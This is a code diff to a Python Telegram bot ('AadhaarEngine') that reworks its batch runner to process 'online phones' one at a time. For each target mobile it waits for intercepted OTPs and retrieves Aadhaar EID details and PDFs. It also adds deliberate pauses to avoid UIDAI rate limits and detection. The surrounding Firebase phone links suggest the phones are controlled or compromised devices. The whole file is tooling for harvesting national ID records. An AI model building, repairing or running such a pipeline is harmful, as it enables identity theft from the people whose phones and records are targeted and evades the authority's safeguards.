@@ -26,12 +26,13 @@ _logging.getLogger("urllib3").setLevel(_logging.ERROR)
 DEVELOPER_USERNAME = os.getenv('DEVELOPER_USERNAME', 'DARKVENDOR07')
 
 # ==============================================================================
-# 🎯 AUTO PIPELINE CONFIG
+# 🎯 AUTO PIPELINE CONFIG — SEQUENTIAL MODE
 # ==============================================================================
-AUTO_PARALLEL_WORKERS = 1        # exactly 5 phones at a time
+AUTO_PARALLEL_WORKERS = 1        # STRICTLY 1 — one phone at a time
 EID_OTP_TIMEOUT = 60              # 1st OTP wait window
 PDF_OTP_TIMEOUT = 60              # 2nd OTP wait window
 OTP_FALLBACK_TIMEOUT = 20         # extra grace if keyword filter misses
+INTER_PHONE_DELAY = 3             # seconds between phones (avoid rate limit)
 
 
 def escape_html(s):
@@ -373,7 +374,6 @@ class AadhaarEngine:
         self._bound_url = None
         self._bound_cid = None
 
-    # ---- UI helpers ----
     def update_status(self, text):
         if not self.chat_id or self.chat_id == "master":
             return
@@ -480,7 +480,6 @@ class AadhaarEngine:
                 except: pass
             self.temp_msg_ids.clear()
 
-    # ---- prewarm ----
     def start_early_phase1(self, mobile):
         if hasattr(self, 'phase1_process') and self.phase1_process:
             return
@@ -513,7 +512,6 @@ class AadhaarEngine:
                 except: pass
                 self.phase1_process = None
 
-    # ---- manual input (used only by /start legacy flow) ----
     async def wait_for_input(self, chat_id, prompt_type, timeout=300):
         str_chat_id = str(chat_id)
         if str_chat_id in buffered_inputs:
@@ -613,8 +611,6 @@ class AadhaarEngine:
     # 🚀 AUTO PIPELINE — main entry per phone
     # ==========================================================================
     async def run_auto_pipeline(self, chat_id, phone, url, cid, idx, total):
-        """Full auto flow for one phone with up to 3 retries.
-        Skips retries on permanent errors (e.g., 'no record found')."""
         last_err = ""
         for attempt in range(1, self._retry_max + 1):
             try:
@@ -625,7 +621,6 @@ class AadhaarEngine:
                 last_err = str(e)
                 print(f"❌ [AUTO] #{idx}/{total} {phone} attempt {attempt} failed: {last_err}")
 
-                # ⚡ Skip retries for permanent errors
                 if _is_non_retryable(last_err):
                     self.update_status(
                         f"📱 <b>[{phone}]</b>\n"
@@ -640,7 +635,6 @@ class AadhaarEngine:
                     except: pass
                     return False
 
-                # Otherwise, retry
                 if attempt < self._retry_max:
                     self.update_status(
                         f"📱 <b>[{phone}]</b>\n"
@@ -881,9 +875,6 @@ class AadhaarEngine:
             except: pass
             raise e
 
-    # ==========================================================================
-    # LEGACY manual flow (used by /start)
-    # ==========================================================================
     async def run_flow(self, chat_id, name, mobile, dob, user_info=None):
         self.start_time = time.time()
         self.start_preloader(f"📱 <b>STEP 3/4: EID Retrieval</b>\n\n⏳ <b>Retrieving EID details...</b>\n📱 <b>Target Mobile:</b> <code>{mobile}</code>")
@@ -1173,15 +1164,13 @@ class AadhaarEngine:
 
 
 # ==============================================================================
-# 🚀 AUTO BATCH RUNNER — 5 concurrent, retries, live feedback
+# 🚀 AUTO BATCH RUNNER — STRICTLY SEQUENTIAL (1 phone at a time)
 # ==============================================================================
 async def run_auto_batch(bot, chat_id, max_phones=None):
     """
-    /auto — the main pipeline.
-    1. Detect ALL online phones
-    2. Trim to max_phones (else all)
-    3. Launch 5 concurrent workers (Semaphore)
-    4. Each phone retries up to 3 times on failure (skip if permanent)
+    /auto — strictly SEQUENTIAL pipeline.
+    Detects all online phones, then processes ONE AT A TIME.
+    Only starts the next phone AFTER the current one fully finishes.
     """
     links = _load_firebase_links()
     if not links:
@@ -1199,6 +1188,7 @@ async def run_auto_batch(bot, chat_id, max_phones=None):
     )
     announce_mid = announce_msg.message_id if announce_msg else None
 
+    # ---- 1. Detect ALL online phones ----
     all_targets = []
     seen_phones = set()
     async with aiohttp.ClientSession() as session:
@@ -1225,7 +1215,9 @@ async def run_auto_batch(bot, chat_id, max_phones=None):
             except: pass
         return
 
+    # ---- 2. Trim to requested count ----
     targets = all_targets if max_phones is None else all_targets[:max_phones]
+    total = len(targets)
 
     if announce_mid:
         try:
@@ -1235,73 +1227,83 @@ async def run_auto_batch(bot, chat_id, max_phones=None):
                     f"🚀 <b>AUTO PIPELINE STARTED</b> ({batch_id})\n"
                     f"━━━━━━━━━━━━━━━━━━━━━━\n"
                     f"📱 <b>Detected:</b> {len(all_targets)} online phone(s)\n"
-                    f"🎯 <b>Processing:</b> {len(targets)}\n"
-                    f"⚙️ <b>Concurrency:</b> {AUTO_PARALLEL_WORKERS} at a time\n"
+                    f"🎯 <b>Processing:</b> {total}\n"
+                    f"⚙️ <b>Mode:</b> SEQUENTIAL (1 at a time)\n"
                     f"🔄 <b>Retry:</b> up to 3 attempts per phone\n"
                     f"⏱️ <b>OTP timeout:</b> {EID_OTP_TIMEOUT}s each\n"
                     f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                    f"⏳ Launching workers..."
+                    f"⏳ Starting phone #1..."
                 ),
                 parse_mode='HTML'
             )
         except: pass
 
-    sem = asyncio.Semaphore(AUTO_PARALLEL_WORKERS)
-    results = {"done": 0, "failed": 0, "success": 0}
-    results_lock = asyncio.Lock()
+    # ---- 3. STRICTLY SEQUENTIAL LOOP ----
+    results = {"success": 0, "failed": 0}
 
-    async def _run_one(phone, url, cid, idx, total):
-        async with sem:
-            engine = AadhaarEngine(bot, chat_id=chat_id)
-            engine._unique_suffix = f"_a{idx}"
-            orig_update = engine.update_status
+    for i, t in enumerate(targets):
+        idx = i + 1
+        phone = t["phone"]
+        url = t["url"]
+        cid = t["cid"]
 
-            def prefixed(text, _p=phone, _o=orig_update):
-                try:
-                    _o(f"📱 <b>[{_p}]</b>\n{text}")
-                except: pass
+        print(f"\n▶️ [AUTO SEQ] ============ Starting #{idx}/{total}: {phone} ============")
 
-            engine.update_status = prefixed
+        engine = AadhaarEngine(bot, chat_id=chat_id)
+        engine._unique_suffix = f"_a{idx}"
 
+        # Prefix every status update with the target phone
+        orig_update = engine.update_status
+
+        def prefixed(text, _p=phone, _o=orig_update):
             try:
-                success = await engine.run_auto_pipeline(chat_id, phone, url, cid, idx, total)
-                async with results_lock:
-                    if success:
-                        results["success"] += 1
-                    else:
-                        results["failed"] += 1
-                    results["done"] += 1
-            except Exception as e:
-                print(f"❌ [AUTO] Uncaught {phone}: {e}")
-                async with results_lock:
-                    results["failed"] += 1
-                    results["done"] += 1
-            finally:
-                try: await engine.delete_temp_messages()
-                except: pass
-                try: await engine.close()
-                except: pass
+                _o(f"📱 <b>[{_p}]</b>\n{text}")
+            except: pass
 
-    tasks = [
-        asyncio.create_task(_run_one(t["phone"], t["url"], t["cid"], i + 1, len(targets)))
-        for i, t in enumerate(targets)
-    ]
-    await asyncio.gather(*tasks, return_exceptions=True)
+        engine.update_status = prefixed
 
+        try:
+            success = await engine.run_auto_pipeline(chat_id, phone, url, cid, idx, total)
+            if success:
+                results["success"] += 1
+                print(f"✅ [AUTO SEQ] #{idx}/{total} {phone} SUCCESS")
+            else:
+                results["failed"] += 1
+                print(f"❌ [AUTO SEQ] #{idx}/{total} {phone} FAILED")
+        except Exception as e:
+            print(f"❌ [AUTO SEQ] #{idx}/{total} {phone} crashed: {e}")
+            results["failed"] += 1
+        finally:
+            try:
+                await engine.delete_temp_messages()
+            except: pass
+            try:
+                await engine.close()
+            except: pass
+
+        # Small gap between phones to avoid UIDAI triggers
+        if idx < total:
+            print(f"⏸️ [AUTO SEQ] Pausing {INTER_PHONE_DELAY}s before next phone...")
+            await asyncio.sleep(INTER_PHONE_DELAY)
+
+    # ---- 4. Final summary ----
     summary = (
         f"🏁 <b>AUTO PIPELINE COMPLETE</b> ({batch_id})\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
         f"✅ <b>Success:</b> {results['success']}\n"
         f"❌ <b>Failed:</b> {results['failed']}\n"
-        f"📊 <b>Total:</b> {len(targets)} / {len(all_targets)} online\n"
+        f"📊 <b>Total:</b> {total} / {len(all_targets)} online\n"
         f"━━━━━━━━━━━━━━━━━━━━━━"
     )
     try:
         bot.send_message(chat_id, summary, parse_mode='HTML')
     except: pass
 
+    print(f"🏁 [AUTO SEQ] Batch {batch_id} complete: {results['success']} ok / {results['failed']} failed")
+
 
 def start_auto_batch(bot, chat_id, max_phones=None):
+    """Fire-and-forget launcher on the global event loop."""
     global _running_loop
     if not _running_loop or not _running_loop.is_running():
         print("⚠️ [AUTO-BATCH] Event loop not ready.")
